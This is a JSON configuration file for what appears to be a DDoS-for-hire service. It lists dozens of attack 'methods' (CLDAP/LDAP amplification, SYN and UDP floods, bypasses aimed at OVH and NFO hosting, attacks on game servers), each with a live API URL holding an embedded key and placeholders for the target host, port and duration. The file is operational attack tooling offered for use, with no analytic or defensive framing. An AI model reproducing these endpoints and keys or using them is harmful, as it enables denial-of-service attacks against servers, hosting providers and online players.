{
	"methods": [{
			"name": "home-insanity",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=HOME-INSANITY"
			}
		},
		{
			"name": "chargen-stm",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=CHARGEN-STM"
			}
		},
		{
			"name": "cldap",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=CLDAP"
			}
		},
		{
			"name": "ovh-storm",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=OVH-STORM"
			}
		},
		{
			"name": "ovh-stormv2",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=OVH-STORMV2"
			}
		},
		{
			"name": "ovhparty-xv",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=OVHPARTY-XV"
			}
		},
		{
			"name": "ovhgone-xv",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=OVHGONE-XV"
			}
		},
		{
			"name": "ovhvalor-xv",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=OVHVALOR-XV"
			}
		},
		{
			"name": "ovhhell-xv",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=OVHHELL-XV"
			}
		},
		{
			"name": "ovh-intel",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=OVH-INTEL"
			}
		},
		{
			"name": "100up-omfg",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=100UP-OMFG"
			}
		},
		{
			"name": "100up-omfgv2",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=100UP-OMFGV2"
			}
		},
		{
			"name": "hydra-crush",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=HYDRA-CRUSH"
			}
		},
		{
			"name": "nfo-storm",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=NFO-STORM"
			}
		},
		{
			"name": "nfoclap-xv",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=NFOCLAP-XV"
			}
		},
		{
			"name": "nfodown-xv",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=NFODOWN-XV"
			}
		},
		{
			"name": "nfomulti-xv",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=NFOMULTI-XV"
			}
		},
		{
			"name": "nfo-beta",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=NFO-BETA"
			}
		},
		{
			"name": "storm-xv",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=STORM-XV"
			}
		},
		{
			"name": "multi-syn",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=MULTI-SYN"
			}
		},
		{
			"name": "syn-kill",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=SYN-KILL"
			}
		},
		{
			"name": "vpn-drop",
			"description": "Storm LLC",
			"ID": 4,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=VPN-DROP"
			}
		},
		{
			"name": "chaos-xv",
			"description": "Storm LLC",
			"ID": 5,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=CHAOS-XV"
			}
		},
		{
			"name": "udpbypassv2",
			"description": "Storm LLC",
			"ID": 6,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=UDPBPYASSv2"
			}
		},
		{
			"name": "secure-gg",
			"description": "Storm LLC",
			"ID": 8,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=SECURE-GG"
			}
		},
		{
			"name": "tcp-storm",
			"description": "Storm LLC",
			"ID": 9,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=TCP-STORM"
			}
		},
		{
			"name": "dominate-v2",
			"description": "Storm LLC",
			"ID": 9,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=DOMINATE-V2"
			}
		},
		{
			"name": "zoom-class",
			"description": "Storm LLC",
			"ID": 9,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=ZOOM-CLASS"
			}
		},
		{
			"name": "webserver-storm",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=WEBSERVER-STORM"
			}
		},
		{
			"name": "fn-storm",
			"description": "Storm LLC",
			"ID": 2,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=FN-STORM"
			}
		},
		{
			"name": "apex-kill",
			"description": "Storm LLC",
			"ID": 12,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=APEX-KILL"
			}
		},
		{
			"name": "r6-storm",
			"description": "Storm LLC",
			"ID": 11,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=R6-STORM"
			}
		},
		{
			"name": "ark-255",
			"description": "Storm LLC",
			"ID": 14,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=ARK-255"
			}
		},
		{
			"name": "roblox",
			"description": "Storm LLC",
			"ID": 9,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=ROBLOX"
			}
		},
		{
			"name": "cod-midnight",
			"description": "Storm LLC",
			"ID": 10,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=COD-MIDNIGHT"
			}
		},
		{
			"name": "2k-storm",
			"description": "Storm LLC",
			"ID": 15,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=2K-STORM"
			}
		},
		{
			"name": "dvr",
			"description": "Storm LLC",
			"ID": 17,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=DVR"
			}
		},
		{
			"name": "game",
			"description": "Storm LLC",
			"ID": 18,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=GAME"
			}
		},
		{
			"name": "https-storm",
			"description": "Storm LLC",
			"ID": 19,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=HTTPS-STORM"
			}
		},
		{
			"name": "autobypass-xv",
			"description": "Storm LLC",
			"ID": 21,
			"Links": {
				"Apilink": "https://stormapi.xyz/AllAPI.php?key=ELETRIC-LIFETIME-JIWEFJIWEFIM&host=[target]&port=[time]&time=[port]&method=AUTOBYPASS-XV"
			}
		},
		{
			"name": "CLDAP",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=CLDAP"
			}
		},
		{
			"name": "LDAP",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=LDAP"
			}
		},
		{
			"name": "HOME-RAPE",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=HOME-RAPE"
			}
		},
		{
			"name": "UDPRAW",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=UDPRAW"
			}
		},
		{
			"name": "ACKRAW",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=ACKRAW"
			}
		},
		{
			"name": "OVH-TOKYO",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=OVH-TOKYO"
			}
		},
		{
			"name": "OVH-BEAM",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=OVH-BEAM"
			}
		},
		{
			"name": "NFO-TOKYO",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=NFO-TOKYO"
			}
		},
		{
			"name": "NFO-CLAP",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=NFO-CLAP"
			}
		},
		{
			"name": "100UP-SLAP",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=100UP-SLAP"
			}
		},
		{
			"name": "FN-TOKYO",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=FN-TOKYO"
			}
		},
		{
			"name": "APEX-BEAM",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=APEX-BEAM"
			}
		},
		{
			"name": "R6-GREEN",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=R6-GREEN"
			}
		},
		{
			"name": "ROBLOX",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=ROBLOX"
			}
		},
		{
			"name": "COD-ALL",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=LDAP"
			}
		},
		{
			"name": "2K-BEAM",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=2K-BEAM"
			}
		},
		{
			"name": "HTTP-TOKYO",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=HTTP-TOKYO"
			}
		},
		{
			"name": "AUTOBYPASS",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=AUTOBYPASS"
			}
		},
		{
			"name": "DSTAT-PAD",
			"description": "Tokyo API",
			"ID": 19,
			"Links": {
				"Apilink": "http://149.56.35.183/?key=jQPKVCzbQ0Q84nO3eyoQPA&host=[target]&port=[time]&time=[port]&method=DSTAT-PAD"
			}
		}
	]
}